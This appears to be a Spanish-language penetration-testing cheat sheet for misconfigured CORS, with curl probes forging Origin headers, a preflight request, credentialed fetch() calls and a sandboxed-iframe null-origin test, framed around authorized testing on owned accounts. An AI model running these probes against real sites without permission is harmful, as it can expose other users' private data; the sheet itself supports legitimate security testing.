# 🗡️ CORS mal configurado: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Reflejo de Origin arbitrario

**Objetivo:** Comparar ACAO con un origen propio que no está permitido.

```bash
curl -si -H "Origin: https://{CONTROLLED_HOST}" "https://{ORIGEN}/api/me"
```

**Interpretación:** Si ACAO refleja el origen, comprobar también ACAC, cookies y datos privados desde navegador.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cors).

### 2. Origin null

**Objetivo:** Comprobar si un origen opaco se acepta en el endpoint privado.

```bash
curl -si -H "Origin: null" "https://{ORIGEN}/api/me"
```

**Interpretación:** ACAO: null por sí solo es insuficiente; crear un contexto opaco de laboratorio y verificar lectura real.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cors).

### 3. Sufijo de dominio no anclado

**Objetivo:** Probar un dominio controlado que contiene el nombre permitido como prefijo.

```bash
curl -si -H "Origin: https://{ORIGEN}.{CONTROLLED_HOST}" "https://{ORIGEN}/api/me"
```

**Interpretación:** Solo es bypass si la allowlist refleja exactamente ese origen y un navegador lee datos de prueba.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cors).

### 4. Prefijo de dominio no anclado

**Objetivo:** Probar una comparación de texto que admite un prefijo aparentemente confiable.

```bash
curl -si -H "Origin: https://{SUBDOMINIO_PERMITIDO}-{CONTROLLED_HOST}" "https://{ORIGEN}/api/me"
```

**Interpretación:** La eficacia depende de la regex o parser del servidor. Sustituir por un host efectivamente propio.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cors).

### 5. Preflight de método/cabecera

**Objetivo:** Inspeccionar autorización de una solicitud no simple.

```http
OPTIONS /api/me HTTP/1.1
Host: {ORIGEN}
Origin: https://{CONTROLLED_HOST}
Access-Control-Request-Method: GET
Access-Control-Request-Headers: X-Prueba
```

**Interpretación:** Revisar ACAO, ACAM, ACAH y ACAC; un preflight permisivo no confirma respuesta privada legible.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cors/access-control-allow-origin).

### 6. Lectura con credenciales en navegador

**Objetivo:** Confirmar desde el origen controlado y cuenta propia.

```js
fetch("https://{ORIGEN}/api/me", {credentials:"include"}).then(r=>r.text()).then(t=>console.log(t.length)).catch(console.error)
```

**Interpretación:** Registrar solo longitud o marcador propio; la cookie debe viajar según SameSite y la respuesta debe contener datos privados.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cors).

### 7. Wildcard y credenciales

**Objetivo:** Descartar la interpretación errónea de ACAO: * más ACAC true.

```bash
curl -si -H "Origin: https://{CONTROLLED_HOST}" "https://{ORIGEN}/api/me" | rg -i 'access-control-allow-(origin|credentials)'
```

**Interpretación:** El navegador no concede lectura con credenciales si ACAO es *; no reportarlo como fuga sin PoC en navegador.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cors/access-control-allow-origin).

### 8. Vary: Origin

**Objetivo:** Comparar respuestas de dos orígenes propios en una URL única cacheable.

```bash
curl -si -H "Origin: https://{CONTROLLED_HOST_A}" "https://{ORIGEN}/api/prueba?cb=123"
curl -si -H "Origin: https://{CONTROLLED_HOST_B}" "https://{ORIGEN}/api/prueba?cb=123"
```

**Interpretación:** Si hay caché compartida, comprobar ACAO entregado al segundo origen; no inferir poisoning sin evidencia de caché.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cors).

### 9. Origen null desde sandbox

**Objetivo:** Confirmar la cabecera null con una página opaca real.

```html
<script>addEventListener('message',e=>console.log(e.data))</script><iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://{ORIGEN}/api/me',{credentials:'include'}).then(r=>r.text()).then(x=>parent.postMessage(x.length,'*')).catch(console.error)</script>"></iframe>
```

**Interpretación:** El iframe sandbox produce Origin null; observar lectura solo sobre sesión propia. La política de cookies puede bloquearla.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cors).

### 10. Subdominio HTTP confiado

**Objetivo:** Comprobar allowlist que acepta un origen sin TLS.

```bash
curl -si -H "Origin: http://{SUBDOMINIO_PERMITIDO}.{ORIGEN}" "https://{ORIGEN}/api/me"
```

**Interpretación:** La cabecera sola no demuestra impacto; hace falta un subdominio controlable y lectura desde navegador.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cors).

### 11. Origen confiado con XSS

**Objetivo:** Probar cadena CORS con XSS ya validado en un origen autorizado.

```js
fetch('https://{ORIGEN}/api/me',{credentials:'include'}).then(r=>r.text()).then(x=>console.log(x.length))
```

**Interpretación:** Ejecutar exclusivamente desde la página de prueba del subdominio autorizado; demostrar tanto XSS como lectura.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/cors).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
